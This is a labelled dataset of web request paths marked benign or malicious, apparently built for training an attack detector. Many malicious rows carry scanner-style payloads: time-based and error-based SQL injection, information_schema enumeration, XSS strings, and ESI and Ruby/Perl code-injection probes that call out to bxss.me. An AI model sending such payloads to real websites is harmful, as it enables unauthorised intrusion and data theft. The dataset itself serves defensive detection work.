request	label
/*******/qiye/b-e2019715.html	0
/***/0/02/05/51/2055193_707293.jpg	0
/****/ysqgk/zzqzfzsjgzssydw/sy.html?id=93	0
"/******/5<esi:include src=""""http://bxss.me/rpb.png""""/>/top-footer.css"	1
"/****/czgk/bmjs/zzqjcyxt/dwkqrmjcy/\""javascript:void(0)\"""	1
/**********/system/2021/08/20/013437715.shtml	0
/*******/0o8.php	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u4f1f\u946b\u4fdd\u6d01\u670d\u52a1\u90e8	0
/******/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5(865014741))) --	1
/**********/system/2020/07/23/013211573.shtml	0
/****/bmkx/sfgw/201610/t20161025_14148.html	0
/***/0/11/33/56/11335608_958249.jpg	0
/**********/system/2020/04/04/013132013.shtml	0
/****/ezgg/ezscjy/201607/t20160727_93447.html	0
/****/tpgj/	1
/******/system/2021/01/29/013329020.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u8001\u5175\u7852\u7802\u74dc\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/zxft/201906/t20190611_1541510.html	0
/****/zzxxgk/bmfgj/fgfzgg/fggzdt/202104/w020210416544931137073.png	0
"/****/bysrd/201612/t20161202_79141.html?leader=0""""xor(if(now()=sysdate(),sleep(3),0))xor""""z"	1
"/*/doinfo/changeclass.php?mid=1'""""()&%<acx><script >cz6c(9391)</script>"	1
/**********/2021-12-06.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u4f9d\u6cd5\u5904\u7f6e\u8fdd\u6cd5\u8fdd\u89c4\u201c\u5934\u90e8\u8d26\u53f7\u201d	0
/*******/qiye/b-e946801.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u95fd\u5b81\u9547\u559c\u5168\u864e\u725b\u7f8a\u9e21\u8089\u5e97	0
/**/index.php?do=post&id=357&c=dt&a=goods&	1
/******/main3-cbbg.jpg	0
/******/system/2021/03/15/013351064.shtml	0
"/******/admin/edit.php?menu="""">pt>alert(777); script>pt>"	1
/***/interface/comul_total.json.jsp?callback=jquery191007121812737000877_1639980009697	0
/****/czgk/bmjs/rmtt/gsl/201708/t20170818_549591.html	0
/*****/system/2020/01/14/javascript:window.print()	1
/******/resource'||'/js/news/newscontent.js	1
/****/web/search/search?page=3%';select sleep(5)	1
/**********/system/2020/09/28/013256155.shtml	0
/****/dqgz/202007/t20200731_251416.html' and 'x'='y	1
/***/800/11/44/97/11449764_971875.jpg	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u7530\u6d77\u8d27\u7269\u8fd0\u8f93\u90e8	0
"/***/?refresh="""";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()"""""	1
/****/kycg/zdkjcg/	0
/******/images/1.jpg	0
/*****/state/service/166/exec	1
/zwxx_11337/****/201807/t20180716_904997.html	0
/***/ywly/myyfw/ywzzq/ddjs/jjgz/nbfw/gygj/gjgk/zzjg/	0
/******/system/2021/10/14/013464032.shtml	0
/****/20200929/e107649050.html	0
"/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/****/202103/t20210303_2614145.html"	1
"/****/xxczh1/zcwj/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z.htm"	1
"/************/search.do?begin=20201012&end=20211012&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=请输入关键词&searchid='""""()&%<acx><script >6qjr(9312)</script>&tpl=16&websiteid="	1
/****/ztly/xxdj	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5fc3\u9999\u4f34\u997c\u5b50\u5e97	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u7518\u57ce\u4e61\u5b66\u950b\u526f\u98df\u852c\u83dc\u7efc\u5408\u95e8\u5e02\u90e8	0
/zwxx_11337/****/201903/w020190318785942921841.jpg	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqjtt/202108/t20210818_2978487.html	0
/****/xqdt/hnx/201909/t20190902_141704.html	0
/***/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u65b0\u53d1\u5c55\u7406\u5ff5	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u6866\u7eda\u901a\u8baf\u90e8	0
/***/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6ee1\u5e2e	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\u00fa\ufffd\ufffd\ufffd\ufffd\ufffd\u8c78\ufffd\u0635\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/****/zfxxgkzd/index_2.html	0
/*******/tey3xbh.php	1
/************/template/jcse//xfs.bxss.me/16/images/searchbtn.js	1
/****/ghgz/202101/t20210120_269575.html	0
/****/zt/ydyl/201604/t20160419_330417.html	0
/*****/cy/	0
"/***/getsubject?data={""subject_id"":560,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":378358,""sign"":""""}"	0
/***/weixin/getconf?url=https:/xhn-wap.hinews.cn/video_details.html?from=androidapp&id=1252763&version=3.6.0	0
/****/xxgknb/2016/bmnb2016/201703/t20170327_86835.html	0
/***/minip/mama/cssy-2.png	0
/****/ilist.jsp?cat_id=25115	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u4e07\u91cc\u7535\u52a8\u8f66\u7ef4\u4fee\u90e8	0
/****/zgsdt/2021_qydt/202112/t20211209_323052.html	0
/******/n42821/n42825/n1588869'||'/c1589219/content.html	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u901a\u6865\u4e61\u4f9b\u9500\u5408\u4f5c\u793e\u767e\u8d27\u95e8\u5e02\u90e8	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u8c6a\u96c5\u4e30\u88d8\u76ae\u6709\u9650\u516c\u53f8	0
"/****/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/fdcgl/gzdt/1.htm"	1
/***/0/02/12/42/2124211_421110.jpg	0
/**********/system/2020/12/16/013303428.shtml	0
/******/bg2.png	0
"/****/jspmyadmin/tabledata.jsp?server=localhost&db=mysql&table=""""/>alert(777);"	1
/**********/system/2020/08/20/013230349.shtml	0
/***/0/01/90/62/1906202_983252.jpg	0
"/***/col110/index.html"""" and """"x""""=""""y"	1
"/****/zzxxgk/tjj/zfxxgkzn_2123/list.html?new=0.5988356735262026&wvstest=javascript:domxssexecutionsink(1,""""'/""""><xsstag>()locxss"""")"	1
/**/system/2021/11/03/012215228.shtml	0
/*****/system/2011/06/01/010378735.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u90ca\u533a\u4f9b\u9500\u793e\u517b\u6b96\u573a\u897f\u5854\u8089\u5e97	0
/**********/system/2020/11/06/013278763.shtml	0
/******/system/2019/03/28/012841644.shtml	0
/****/zxxx/content.html?metadataid=10062572	0
"/****/files.php?folder="""">alert(777)"	1
/**********/system/2016/05/24/012012674.shtml	0
/**/products/heavymachinery/201505/t20150513_60348.html	1
/****/admin/dash_additem.php?additem_form=alert(777);	1
/***/interface/comul_total.json.jsp?callback=jquery11110032735153480202506_1640016447465	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u4e3d\u82b3\u4e94\u91d1\u5efa\u6750\u7ecf\u9500\u90e8	0
/****/bmkx/snmj/201912/t20191220_145696.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u4e07\u9a6c\u5954\u99e6\u8d27\u8fd0\u670d\u52a1\u90e8	0
"/************/template/jcse/110105008056111/16/images/'""""()&%<acx><script >ap8q(9795)</script>/selectpick/js.js"	1
/****/bmkx/stjj/202105/t20210526_183182.html	0
/ztzl' and 2*3*8=6*8 and 'syfx'='syfx/******/ywdt/10.htm	1
/******/public/2021/11/17/110486.images/v110486_b1637140899218.jpg	0
/****/xxgkzn/list.html?new=/xfs.bxss.me	1
/****/system/2020/04/10/013136936.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u9ad8\u65b0\u6280\u672f\u5f00\u53d1\u533a\u6f6e\u724c\u9020\u578b\u5ba4	0
/cgi-bin/******/cgi-bin/setup.cgi	1
/****/\ufffd\ufffd\u0536	0
/***/0/02/10/96/2109631_298541.jpg	0
/******/usercenter/index?qrcode=quicklyrq,3,129627,10125779&code=071y5all2o3jk84b4jnl2cmnkm0y5alu	0
"/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=请输入关键词<esi:include src=""""http://bxss.me/rpb.png""""/>&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111"	1
/****/xydt/2014hydt/201412/t20141224_50488.html	0
/****/system/javascript:alert(1743)/013446963.shtml	1
/******/public/2021/11/15/20211115_17d2194a745_r1_1200k.mp4http	0
/****/zzxxgk%' and 2*3*8=6*8 and 'xvz4'!='xvz4%/tjj/zfxxgkml_2127/xwfbh_2065/list.html	1
/zwxx_11337/****/202007/t20200706_2155670.html	0
/****/sj1/tjxx/202108/t20210823_2985257.html	0
/***/0/02/12/43/2124386_978664.jpg	0
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/201703/t20170320_162590.html	0
/****/czgk/bmyjs/zzqjcyxt/hgzdqrmjcy/201702/t20170208_318425.html	0
/****/czgk/bmjs/gdyx/zzqjxy/202108/p020210818377277964823.pdf	0
/***/mobile_h5/wapshouye.do?channelid=shegntai	0
/******/n236753'||'/n236776/c1649498/content.html	1
"/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%') or 8858=8858 	1
/***/0/00/53/81/538136_999608.jpg	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u7ecf\u6d4e\u5f00\u53d1\u533a\u5c11\u864e\u8d27\u8fd0\u90e8	0
/****/czgk/bmjs/zzqfyxt/wzszjrmfy	0
/**/system/2020/05/28/011998264.shtml	0
/****/rwfc/javascript:stranbody();	1
/*******/qiye/b-e2029760.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u4e01\u5c11\u5175\u5546\u5e97	0
"/****/czgk/bmyjs/zzqjcyxt/ltqrmjcy/\""javascript:void(0)\"""	1
"/****/wp-admin/admin.php?page=thecartpress/admin/addressedit.php&address_id='""><script>alert(77729;</script>"	1
/****/qzfwj/201803/w020180330543318150688.doc	0
/zwxx_11337/****/201401/t20140114_304432.html	0
/****/ysqgk/zzqzfzsjgzssydw/sy.html?id=87	0
/*******/qiye/b-e1626498.html	0
/******/public/2019/11/12/94017.images/v94017_b1573525394629_app.jpg	0
/**/images/busi.png	0
/**********/2018-03-19.html	0
/****/zdlygk/ncwywfgz/zws/hyx/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm	1
"/**********/*/-->'""""></iframe></script></style></title></textarea><script >alert(01763)</script>"	1
"/****/byszf/202007/t20200701_168748.html?leader=徐　峰<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/****/tzgg/201808/*	0
/*******/index.php	1
/******/http://bxss.me/t/fit.txt?.jpg/1905211146429566.js	1
/*******/qiye/businesses-e21013.html?category_id=169827	0
/****/enums/smile.php	1
/****/20190426/6499.html	0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/202101/t20210108_176019.html	0
/***/interface/url_total_pv.json.jsp?callback=jquery19105086359616364957_1640035068167	0
/**********/system/2021/09/24/013456212.shtml	0
/***/viewspace-383.html	0
/zwxx_11337/****/202004/t20200430_2053916.html	0
/**********/system/2020/11/19/013287026.shtml	0
/**********/system/2021/08/24/013439496.shtml	0
/****/bmkx/sgaj/201806/w020180605384733195766.jpg	0
/*********/index/index' and 2*3*8=6*8 and 'vdo6'='vdo6/goods.html	1
/*******/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg	1
/*****/gy42/ljcpgyview.asp?id=29453864&l2=\ufffd\ufffd\u027d&l=\ufffd\u04f1\ufffd	0
/**********/system/2020/05/15/013162468.shtml	0
/****/pic3/wxj.jpg	0
/******/system/2021/12/17/013495728.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u94f6\u6e56\u673a\u7535\u7ecf\u8425\u90e8	0
/******/xwzx/xnxw/index.shtml	0
"/******/hhs/sszx/""><script>alert(52)</script>"	1
/**********/system/more/217000000000000/0046/217000000000000_00004679.shtml	0
/******/cjxjq/css/1.css	0
/****/czgk/bmyjs/qtdw/zzqtycpglzx/index_1.html	0
/**********/system/2021/11/01/013472816.shtml	0
/******/20211209yn.jpg	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4e09\u8425\u9547\u8000\u4f1a\u8f6e\u80ce\u7ecf\u9500\u90e8	0
/*******/201910211547334010	0
/**/news/xwygx/index_4.html	0
/****/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5929\u5929\u987a\u5546\u884c	0
/****/czgk/bmyjs/rmtt/cl/202103/t20210309_2620356.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u653f\u7b56	0
"/******/qgbzdh/db/index.shtml/""><script>alert(535)</script>"	1
/***/images/youjudenglu.gif	0
/**********/system/2017/08/24/012395114.shtml	0
/****/gsry/2013_506/	1
/****/20210610/javascript:void(0);	1
/****/login.html?status='</script><script>alert(777)</script>	1
"/******/download/downfile.jsp?classid=' 'a'.concat(70-3).concat(22*4).concat(104).concat(82).concat(122).concat(81) (require'socket'
socket.gethostbyname('hitqx' 'aamewajpe33d3.bxss.me.')[3].to_s) '&filename=ad2956b5c62a469ea6bac71f9dae4ee9.doc"	1
/****/jjdytpgjz/202111/t20211126_196993.html	0
/zwxx_11337/****/202104/t20210407_2698892.html	0
"/******/'""""()&%<acx><script >jcqa(9978)</script>/main.css"	1
/**********/system/2021/12/19/013496634.shtml	0
/zwxx_11337/****/202108/t20210819_2981075.html	0
/****/xxgknb/2014/list.html?new=/xfs.bxss.me	1
/***/800/11/09/10/11091089_644070.jpg	1
"/*/doinfo/addinfo.php?submit=添加信息&classid=1&enews=maddinfo&mid='""""()&%<acx><script >87cm(9833)</script>"	1
"/****/czgk<esi:include src=""""http://bxss.me/rpb.png""""/>/bmjs/gdyx/"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5047\u65e5\u9633\u5149\u70e4\u5427	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u65b0\u8d38\u5e02\u573a\u5c0f\u5f20\u6d77\u9c9c\u6279\u53d1\u90e8	0
/**/system/2021/06/08/012167346.shtml	0
/***/0/00/03/50/35077_437461.jpg	0
/****/czgk/bmyjs/rmtt/skl/	0
/system%' and 2*3*8=6*8 and 'gebf'!='gebf%/********/js/newcalendar/my97datepicker.htm	1
"/**/ui"""" and 2*3*8=6*8 and """"ifd9""""=""""ifd9/lib/easyui/plugins/jquery.panel.js"	1
/******/image/h-s.png	0
/**********/system/2020/05/29/013173613.shtml	0
/**********/system/2021/11/13/013479536.shtml	0
/**********/system/2020/05/05/013154501.shtml	0
/****/b-e1148248.html	0
/****/czgk/bmyjs/zzqjcyxt/gysrmjcy/201903/t20190305_1299252.html	0
/__local/*/70/52/1d59b918eb6d00dbd3e16bc2198_683c7a5d_dd9a.png	0
/****/bmkx/ygjt/202011/t20201113_174052.html	0
/****/web/search?searchword=1' or 0782=0797 and '1'='1&channelid=287219&perpage=24&templet=1&token=1	1
/enjoymobilexcx_mt/****/getpicverifycode?mobile=113226858&type=\u9884\u7ea6&dt=1640016582448	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u4e01\u5c0f\u82b1\u997c\u5b50\u5e97	0
/******/jslib/grouppic/http://bxss.me/t/fit.txt?.ad-gallery.js	1
/**/news/xwygx	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5ba3\u548c\u9547\u82b1\u60f3\u5bb9\u670d\u88c5\u5e97	0
/*******/71jz7d.php	1
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(1135)</script>?_=1630311758473"	1
/***/com/menu/menuload.asp	0
"/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqgbdsj/\""javascript:void(0)\"""	1
/*****/system/2011/03/15/010309988.shtml	0
/****/category/guowaishichangzhunru?page=1' or 1601=1601 /*	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9ad8\u8482\u978b\u5e97	0
"/****/web/search?channelid=299868&perpage=1000%' and 7243=7243 	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u674e\u4fca\u9547\u597d\u53c8\u591a\u670d\u88c5\u5e97	0
/**********/system/2020/06/16/013186670.shtml	0
"/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqjgswglj/dwjgswglj/\""javascript:void(0)\"""	1
/****/n7njq9-syxw-e107583092.html	0
/***/0/02/11/85/2118559_651443.jpg	0
/***/0/00/53/92/539260_788657.jpg	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19106393021999392658_1639958400011	0
"/***/col4295/index.html/""><script>alert(881)</script>"	1
/****/202102/t20210202_2589162.html	0
/****/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)>	1
/*******/qiye/b-e2046675.html	0
/**********/system/2020/03/23/javascript:window.close();	1
"/******/"""" """"a"""".concat(70-3).concat(22*4).concat(109).concat(82).concat(103).concat(78) (require""""socket""""
socket.gethostbyname(""""hitib"""" """"cftmjhkl89a2b.bxss.me."""")[3].to_s) """"/phone.js"	1
/****/gggs/201909/t20190906_141910_wap.html	0
"/*****/system/2021/01/21/013323672'""""/>%uff1cscript%uff1ealert%uff081143%uff09%uff1c/script%uff1e.shtml"	1
/****/gjzqq/index.html?continent=-1) or 8449=9082#	1
/******/home/css/css.css	0
/****/gjzqq/index.html?continent=' or 3883=3883 /*	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u7231\u8054\u4fe1\u606f\u54a8\u8be2\u90e8	0
/****/bmkx/sgsj/202103/w020210317654331599697.jpg	0
/****/web/search?searchword=1&channelid=287219&perpage=24%' and 1772=8597 and '%%'='%&templet=1&token=1	1
/***/0/01/57/77/1577719_172919.jpg	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19107171799159217729_1640034950233	0
/****/zpdt/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/****/zxxksh/images/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/system/2021/12/17/013495668.shtml	0
/****/zzxxgk/zrzyj/zfxxgkml_2139/ssjygk	0
/******/resource/js/news/mp4video'||'.js	1
/zwxx_11337/****/201911/t20191127_1864328.html	0
/investors-garden/**********/video%' and 2*3*8=6*8 and 'zd0k'!='zd0k%/index_2.html	1
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqshzyxy/201602/t20160222_318651.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u9ad8\u65b0\u6280\u672f\u5f00\u53d1\u533a\u4e30\u8272\u4fe1\u606f\u54a8\u8be2\u670d\u52a1\u90e8	0
"/*****/dsp_dp_showmonth.cfm? 5=posn 1&datelong="""">alert(777)"	1
"/****/system/2021/09/01'""/><img src=javascript:alert(1854)>/013442863.shtml"	1
/****/bmkx/swjw/202004/t20200424_158283.html	0
/***/layui/lay/modules/laytpl.js	0
"/****/cometchat/plugins/handwrite/index.php?id="""">alert(777)"	1
/*****/gy48/cpgyss.asp?key=\u5c71\u4e1c\u5341\u4e8c\u70f7\u57fa\u78fa\u9178&l=\ufffd\u04f1\ufffd	0
/************/template/jcse/110105008056111/16/images'||'/plugin/websitechange/zwfwv3.js	1
/**********/system/2020/07/22/013210641.shtml	0
/**********/system/2021/12/17/013495587.shtml	0
/******/kxfz/css/1.css	0
/****/tzgg/201905/t20190513_1474331_zzb.html	0
/****/zzxxgk/zrzyj/zfxxgkml_2139/gggs/202009/t20200930_172809.html	0
"/******/5/jquery.superslide.2.bxss.me/t/xss.html?	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6da6\u7965\u548c\u98df\u54c1\u914d\u9001\u6709\u9650\u516c\u53f8	0
"/****/czgk/bmyjs/gmzdp/zzqjsxs/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a>"	0
"/*/210514-1/'""""()&%<acx><script >t2nb(9477)</script>/06c5a0c81119dca7da22fc4fd96413d2.js"	1
/****/20201114/e110375994.html	0
/****/bmkx/sgaj/201806/w020180612358239724533.jpg	0
/***/0/10/88/04/10880429_933632.jpg	0
/****/zdlygk/bzxajgc/gys'||'/jyx.htm	1
/zwxx_11337/****/201708/t20170816_438580.html	0
/*****/system/2016/05/24/012013158.shtml	0
/****/20211027/javascript:void(0);	1
/****/customer-e32849.html	0
/*******/qiye/b-e2404038.html	0
/****/zzxxgk/zrzyj/zfxxgkml_2139/gggs/202110/t20211025_195753.html	0
/****/bmkx/sjsj/202002/t20200217_147921.html	0
/****/mswpmm/common/signin.aspx?tbemailaddress=alert(777)returnurl=/mswpmm/common/default.aspx	1
/**********/system/2014/06/18/011428407.shtml	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u7434\u4e49\u4fbf\u5229\u5e97	0
/****/api/****/getdtectauthurl?redirecturl=https:/www.zsebank.com/****/bank-userinforauthenticationphone.jsp&lxsj=13265419803&tjr=t013192	0
/****/czgk/bmyjs/zzqdwgzbmyxsjg/zzqdwxsb/201802/t20180223_692804.html	0
/************/template/jcse/110105008056111/16/images'||'/plugin/websitechange/zwdt_v3.css	1
/***/0/01/28/02/1280216_281250.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u9762\u5143\u7d20\u9762\u9986	0
"/****/wdsjs/hfswsj/202109/http://bxss.me/t/xss.html?	1
"/******/jslib/http://bxss.me/t/xss.html?	1
/zwxx_11337/****/ytdd/202111/t20211103_3114439.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6d77\u5c14\u96c6\u56e2	0
/****/javascript:stranbody();	1
/***/nbhd/opengovmsgbox.do?method=listgovmsgboxs&siteid=115&order=1&appid=4&pageindex=4&pagesize=10	0
/***/interface/comul_total.json.jsp?callback=jquery191014350943603179678_1639973129738	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u745e\u7965\u4e94\u91d1\u5de5\u5177\u5e97	0
/***/weixin/getconf?url=https:/xhn-wap.hinews.cn/video_details.html?language_type=1&from=iosapp&videotype=0&id=1263718&userid=not_login&version=3.6.0	0
/***/0/01/89/94/1899474_446278.jpg	0
/zwxx_11337/****/202004/w020200414362349430309.jpg	0
/zwxx_11337/****/202003/t20200318_1993654.html	0
/****/zfwjn/1088//xfs.bxss.me/list.html	1
/******/scy_gj_shzrlbsj_05.jpg	0
/zwfw' and 2*3*8=6*8 and 'xsle'='xsle/****/1.htm	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u4e0a\u54c1\u5a74\u5b55\u5a74\u751f\u6d3b\u9986\u4e09\u5206\u5e97	0
/***/003/001/770/00300177067_502d6ca5.jpg	0
/****/tpxw/2012tpxw/201412/t20141218_45580.html	0
/****/zzxxgk/jjhzj/gyjzq/pcq_3664/201906/w020200513796152511330.jpg	0
/****/bmkx/ssfj/index_3.html	0
/if(now()=sysdate(),sleep(15),0)/********/jcse/website.js	1
/**********/system/2019/08/20/012954640.shtml	1
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5bfa\u9662	0
/****/xef_35359/yw_1295/index_1.html	0
"/****/byszf/sz/202108/t20210806_' 'a'.concat(70-3).concat(22*4).concat(104).concat(75).concat(109).concat(86) (require'socket'
socket.gethostbyname('hitbs' 'zrwdcmnw6821c.bxss.me.')[3].to_s) '.html"	1
"/************/' 'a'.concat(70-3).concat(22*4).concat(115).concat(90).concat(114).concat(84) (require'socket'
socket.gethostbyname('hitog' 'yvqetudec3fee.bxss.me.')[3].to_s) '/jcse/110105008056111/16/images/view.js"	1
/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=34&i_articleid=194648	0
/***********/jinrongqihuo/guzhiqihuo' and 2*3*8=6*8 and 'a1sw'='a1sw/index_9.html	1
/*****/system/2016/05/30/012017923.shtml	0
/zwxx_11337/****/index_40.html	0
/***/com%' and 2*3*8=6*8 and 'd4tw'!='d4tw%/images	1
/***/0/02/09/86/2098692_273994.jpg	0
/*****/class/liangkaoxie.php	1
"/******/resource/storage/localupload.jsp?doaction=save) and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""""xor(if(now()=sysdate(),sleep(0),0))or""""*/&rid=1rnott09fg&uptoken=1ff87566684b40c688f756b86e2c3798"	1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' or 6575=1022 and '%'='	1
"/******/"""" """"a"""".concat(70-3).concat(22*4).concat(113).concat(69).concat(100).concat(65) (require""""socket""""
socket.gethostbyname(""""hitpl"""" """"wqsovcjjf6d66.bxss.me."""")[3].to_s) """"/xys.css"	1
/***/interface/daily_clickcount.json.jsp?callback=jquery171040099823185808225_1639980620230	0
"/************/template/jcse/110105008056111/16<esi:include src=""""http://bxss.me/rpb.png""""/>/images/plugin/waterpull/pinterest_grid.js"	1
/**********/system/2021/08/02/013428964.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u632f\u534e\u8d27\u8fd0\u90e8	0
/***/003/003/713/00300371390_083f63e5.jpg	0
/***/zhcx/xm_xsdhmx.asp?n=2021&y=12	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u4f1f\u8f89\u6d17\u6da4\u670d\u52a1\u6709\u9650\u516c\u53f8	0
/****/rsrm/201904/w020190416352119239665.jpg	0
/****/zxxx/content.html?metadataid=10062575	0
/****/byyw/202112/t20211217_197909.html	0
/***/col35/http://bxss.me/t/fit.txt.html	1
/****/zzxxgk/czj/zfxxgkml_2139/czyjsxx/202106/w020210601552251219601.doc	0
"/****/photostore/workbox.php?mode=addtolightbox&mediaid=""""><script>alert(777)</script>"	1
/****/yfc/ldhd/	0
/*******/qiye/home-e39275.html	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(3498)"">?_=1630311906049"	1
"/***/themes/cp_themes/default/images//swfupload.swf?moviename=""]);}catch(e){}if(!self.a)self.a=!alert(1);//"	1
/****/20211115/10742.html	0
/*****/system/2012/11/08/010946712_03.shtml	0
/*******/837420.html	0
/*******/wp-admin/admin-ajax.php	1
"/****/zzxxgk/tjj'""""()&%<acx><script >uocq(9714)</script>/zfxxgkml_2127/jgzn_2042/list.html"	1
/****/xqdt/jtx/201610/t20161025_43712.html	0
/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061/list.html?new=/xfs.bxss.me	1
"/****/byszx/201903/t20190319_115324.html?leader="""".gethostbyname(lc(""""hitxn"""".""""ufcffjle32f81.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(113).chr(80).chr(121).chr(70)."""""	1
